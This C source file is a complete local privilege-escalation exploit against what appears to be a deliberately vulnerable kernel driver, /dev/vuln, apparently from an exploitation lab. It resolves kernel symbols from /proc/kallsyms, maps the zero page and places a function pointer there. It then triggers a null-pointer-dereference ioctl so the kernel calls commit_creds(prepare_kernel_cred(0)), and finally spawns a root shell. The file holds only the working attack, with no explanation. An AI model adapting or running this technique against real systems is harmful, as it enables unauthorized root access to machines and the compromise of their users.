#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>

#include "vuln_ioctl.h"


struct cred;
struct task_struct;

static struct cred *(*prepare_kernel_cred)(struct task_struct *daemon) __attribute__((regparm(3)));
static int (*commit_creds)(struct cred *new) __attribute__((regparm(3)));
static void (*printk)(const char*fmt, ...);

void *get_ksym(char *name) {
	FILE *f = fopen("/proc/kallsyms", "rb");
	char c, sym[512];
	void *addr, *found = NULL;

	while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
		if (!strcmp(sym, name)) {
			found = addr;
			break;
		}
	}
	fclose(f);
	return found;
}

static unsigned long a_printk;

static void get_root(void)
{
	printk("PWNEED!!!\n");
	commit_creds(prepare_kernel_cred(0));
}

int main()
{
	int fd = open("/dev/vuln", O_RDWR);
	if (fd < 0) {
		perror("open dev failed:");
		return -1;
	}

	prepare_kernel_cred = get_ksym("prepare_kernel_cred");
	commit_creds        = get_ksym("commit_creds");
	printk              = get_ksym("printk");

	printf("prepare_kernel_cred: %p\n", prepare_kernel_cred);
	printf("commit_creds: %p\n", commit_creds);
	printf("printk: %p\n", printk);

	void (**fn)(void) = mmap(0, 4096, PROT_READ|PROT_WRITE,
				 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if (fn != NULL) {
		perror("mmap: ");
		close(fd);
		return;
	}
	*fn = get_root;

	int ret = ioctl(fd, VULN_NULL_DEREFERENCE);
	close(fd);
	if (ret) {
		perror("vuln ioctl failed:");
		return ret;
	}

	system("/bin/sh");

	return 0;
}
